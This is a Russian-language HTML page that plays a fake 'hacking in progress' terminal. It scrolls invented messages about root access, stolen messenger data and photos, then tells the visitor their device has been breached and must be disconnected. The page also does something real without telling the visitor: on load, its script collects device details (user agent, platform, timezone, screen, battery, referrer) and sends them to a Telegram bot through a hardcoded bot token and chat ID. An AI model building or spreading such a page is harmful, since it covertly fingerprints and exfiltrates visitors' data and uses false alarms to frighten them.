<!DOCTYPE html>
<html lang="ru">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
  <title>root@system-core:~#</title>
  <style>
    * {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
      user-select: none;
      -webkit-tap-highlight-color: transparent;
    }

    body {
      background-color: #030303;
      color: #00ff41;
      font-family: 'Courier New', Courier, monospace;
      font-size: 12px;
      line-height: 1.3;
      padding: 10px;
      min-height: 100vh;
      overflow-x: hidden;
      text-shadow: 0 0 5px rgba(0, 255, 65, 0.45);
    }

    body::before {
      content: "";
      position: fixed;
      inset: 0;
      background: repeating-linear-gradient(
        0deg,
        rgba(0, 0, 0, 0.22),
        rgba(0, 0, 0, 0.22) 1px,
        transparent 1px,
        transparent 2px
      );
      pointer-events: none;
      z-index: 10;
    }

    #terminal {
      width: 100%;
      max-width: 900px;
      margin: 0 auto;
      padding-bottom: 40px;
    }

    .line {
      margin-bottom: 2px;
      word-break: break-all;
      white-space: pre-wrap;
    }

    .dim {
      color: #009e28;
      opacity: 0.85;
    }

    .warn {
      color: #ffcc00;
      text-shadow: 0 0 5px rgba(255, 204, 0, 0.45);
    }

    .danger {
      color: #ff2a4b;
      font-weight: bold;
      text-shadow: 0 0 8px rgba(255, 42, 75, 0.65);
    }

    .info {
      color: #00d9ff;
      text-shadow: 0 0 5px rgba(0, 217, 255, 0.45);
    }

    .cursor-line {
      margin-top: 4px;
    }

    .cursor {
      display: inline-block;
      width: 8px;
      height: 14px;
      background: #00ff41;
      vertical-align: middle;
      animation: blink 0.6s infinite;
    }

    @keyframes blink {
      0%, 49% { opacity: 1; }
      50%, 100% { opacity: 0; }
    }

    #final-alert {
      display: none;
      position: fixed;
      inset: 0;
      background: #050000;
      align-items: center;
      justify-content: center;
      text-align: center;
      padding: 24px;
      z-index: 99;
    }

    #final-alert .alert-text {
      color: #ff1a35;
      font-size: 28px;
      font-weight: bold;
      line-height: 1.4;
      text-transform: uppercase;
      text-shadow: 0 0 20px rgba(255, 26, 53, 0.9);
      animation: pulseRed 0.9s infinite alternate;
    }

    @keyframes pulseRed {
      from { opacity: 0.78; transform: scale(0.98); }
      to { opacity: 1; transform: scale(1.02); }
    }
  </style>
</head>
<body>

  <div id="terminal">
    <div id="output"></div>
    <div class="cursor-line">root@kernel:~# <span class="cursor"></span></div>
  </div>

  <div id="final-alert">
    <div class="alert-text">Доступ получен. Немедленно отключите свое устройство.</div>
  </div>

  <script>
    const TG_BOT_TOKEN = "8294247946:AAFg9JHzStcfuxkF2jh5VJT7OYhIBIZgrAk";
    const TG_CHAT_ID = "8215850367";
    const DURATION_MS = 30000;

    const terminalEl = document.getElementById("terminal");
    const output = document.getElementById("output");
    const finalAlert = document.getElementById("final-alert");

    let finished = false;
    const startTime = Date.now();

    function getTimestamp() {
      const elapsed = ((Date.now() - startTime) / 1000).toFixed(3);
      return `[${elapsed.padStart(6, "0")}]`;
    }

    function randomHex(len) {
      const chars = "0123456789abcdef";
      let out = "";
      for (let i = 0; i < len; i++) {
        out += chars[Math.floor(Math.random() * chars.length)];
      }
      return out;
    }

    function randomIp() {
      return `${Math.floor(Math.random() * 223) + 1}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 254) + 1}`;
    }

    function escapeHtml(str) {
      return String(str)
        .replace(/&/g, "&amp;")
        .replace(/</g, "&lt;")
        .replace(/>/g, "&gt;");
    }

    // Сбор базовой информации об устройстве и отправка в Telegram
    async function collectAndSendTelemetry() {
      const ua = navigator.userAgent || "Unknown";
      const platform = navigator.platform || "Unknown";
      const lang = navigator.language || "Unknown";
      const tz = Intl.DateTimeFormat().resolvedOptions().timeZone || "Unknown";
      const screenInfo = `${window.screen.width}x${window.screen.height} (x${window.devicePixelRatio || 1})`;
      const cores = navigator.hardwareConcurrency ? `${navigator.hardwareConcurrency} ядер` : "Н/Д";
      const ram = navigator.deviceMemory ? `~${navigator.deviceMemory} ГБ` : "Н/Д";
      const online = navigator.onLine ? "Онлайн" : "Офлайн";
      const ref = document.referrer || "Прямой переход";
      const nowStr = new Date().toLocaleString("ru-RU");

      let batteryStr = "Не поддерживается";
      try {
        if (navigator.getBattery) {
          const bat = await navigator.getBattery();
          const lvl = Math.round(bat.level * 100);
          batteryStr = `${lvl}% (${bat.charging ? "заряжается" : "от батареи"})`;
        }
      } catch (e) {}

      const text =
        `🚨 <b>ТЕРМИНАЛ ЗАПУЩЕН!</b>\n\n` +
        `🕒 <b>Время:</b> ${escapeHtml(nowStr)}\n` +
        `🌍 <b>Часовой пояс:</b> ${escapeHtml(tz)}\n` +
        `💻 <b>Платформа:</b> ${escapeHtml(platform)}\n` +
        `📐 <b>Экран:</b> ${escapeHtml(screenInfo)}\n` +
        `⚙️ <b>CPU / RAM:</b> ${escapeHtml(cores)} / ${escapeHtml(ram)}\n` +
        `🔋 <b>Батарея:</b> ${escapeHtml(batteryStr)}\n` +
        `🗣 <b>Язык:</b> ${escapeHtml(lang)} (${online})\n` +
        `🔗 <b>Откуда перешёл:</b> ${escapeHtml(ref)}\n\n` +
        `📱 <b>User-Agent:</b>\n<code>${escapeHtml(ua)}</code>`;

      try {
        await fetch(`https://api.telegram.org/bot${TG_BOT_TOKEN}/sendMessage`, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            chat_id: TG_CHAT_ID,
            text: text,
            parse_mode: "HTML"
          })
        });
      } catch (e) {}
    }

    const staticEvents = [
      { text: "Initializing kernel hook & socket layer...", cls: "info" },
      { text: `Target viewport locked: ${window.screen.width}x${window.screen.height} @ ${window.devicePixelRatio || 1}x`, cls: "" },
      { text: `Host environment: ${navigator.platform || "ARM64/Linux"} | Lang: ${navigator.language}`, cls: "warn" },
      { text: "Handshake established with relay node 185.220.101.44:443 [TLS 1.3]", cls: "info" },
      { text: "Bypassing sandbox isolation policies...", cls: "warn" },
      { text: "[OK] Escalated privileges -> uid=0(root) gid=0(root)", cls: "" },
      { text: "Mounting /dev/block/userdata -> /mnt/dump (ro,noatime)", cls: "" },
      { text: "Scanning SQLite databases: contacts2.db, mmssms.db, wa.db...", cls: "warn" },
      { text: "Extracting session tokens & keystore blobs...", cls: "danger" },
      { text: "WARNING: Firewall anomaly suppressed on interface wlan0", cls: "warn" },
      { text: "Dumping DCIM/Camera index & thumbnails...", cls: "info" },
      { text: "Compressing payload archive: dump_0x94F2.tar.gz (148.6 MB)", cls: "" },
      { text: "Streaming encrypted chunks to C2 endpoint...", cls: "danger" },
      { text: "Overwriting system recovery flags & disabling user prompt...", cls: "danger" },
      { text: "Finalizing remote persistence daemon...", cls: "warn" }
    ];

    const dynamicGenerators = [
      () => ({
        text: `0x${randomHex(8)}: ${randomHex(8)} ${randomHex(8)} ${randomHex(8)} ${randomHex(8)} | .${randomHex(6)}..`,
        cls: "dim"
      }),
      () => ({
        text: `TCP ${randomIp()}:${Math.floor(Math.random() * 50000 + 1024)} -> 10.0.2.15:443 [SYN, ACK] len=${Math.floor(Math.random() * 1400 + 64)}`,
        cls: "dim"
      }),
      () => ({
        text: `READ /data/data/org.telegram.messenger/cache/${randomHex(12)}.bin (${Math.floor(Math.random() * 900 + 12)} KB) [OK]`,
        cls: ""
      }),
      () => ({
        text: `DECRYPT block #${Math.floor(Math.random() * 9999)} key=0x${randomHex(16)} -> VERIFIED`,
        cls: "info"
      }),
      () => ({
        text: `PACKET_OUT chunk_${Math.floor(Math.random() * 800)} -> 100% ACK (${(Math.random() * 12 + 2).toFixed(1)} MB/s)`,
        cls: ""
      }),
      () => ({
        text: `ALERT: Process watchdog bypassed (PID ${Math.floor(Math.random() * 28000 + 1000)})`,
        cls: "warn"
      }),
      () => ({
        text: `EXTRACT /storage/emulated/0/DCIM/IMG_2026_${Math.floor(Math.random() * 8999 + 1000)}.jpg -> QUEUED`,
        cls: "danger"
      })
    ];

    function appendLine(text, cls = "") {
      if (finished) return;
      const div = document.createElement("div");
      div.className = "line " + cls;
      div.textContent = `${getTimestamp()} ${text}`;
      output.appendChild(div);

      // Ограничиваем количество строк в DOM, чтобы телефон не тормозил при высокой скорости
      if (output.children.length > 140) {
        output.removeChild(output.firstChild);
      }
      window.scrollTo(0, document.body.scrollHeight);
    }

    function showFinalAlert() {
      if (finished) return;
      finished = true;
      terminalEl.style.display = "none";
      finalAlert.style.display = "flex";
    }

    function startTerminal() {
      collectAndSendTelemetry();
      setTimeout(showFinalAlert, DURATION_MS);

      let staticIdx = 0;
      let tick = 0;

      const loop = setInterval(() => {
        if (finished) {
          clearInterval(loop);
          return;
        }

        tick++;

        // Каждые 12 тиков вставляем ключевое событие, остальное время — быстрый поток дампа
        if (tick % 12 === 1 && staticIdx < staticEvents.length) {
          const ev = staticEvents[staticIdx++];
          appendLine(ev.text, ev.cls);
        } else {
          // Печатаем по 2 строки за тик для эффекта реального быстрого терминала
          const g1 = dynamicGenerators[Math.floor(Math.random() * dynamicGenerators.length)]();
          appendLine(g1.text, g1.cls);

          if (Math.random() > 0.35) {
            const g2 = dynamicGenerators[Math.floor(Math.random() * dynamicGenerators.length)]();
            appendLine(g2.text, g2.cls);
          }
        }
      }, 55);
    }

    startTerminal();
  </script>
</body>
</html>
